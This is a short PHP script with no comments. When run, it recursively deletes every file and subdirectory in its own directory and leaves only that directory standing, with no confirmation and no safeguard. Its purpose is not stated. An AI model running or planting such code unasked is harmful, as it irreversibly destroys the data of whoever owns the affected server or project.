<?php
$dir = __DIR__; 
function removeDirectory($dir) {
	if ($objs = glob($dir."/*")) {
		foreach($objs as $obj) {
			if(is_dir($obj)) { removeDirectory($obj); } 
			else { 
		unlink($obj);
	} } }
	if($dir != __DIR__) rmdir($dir); 
}
removeDirectory($dir);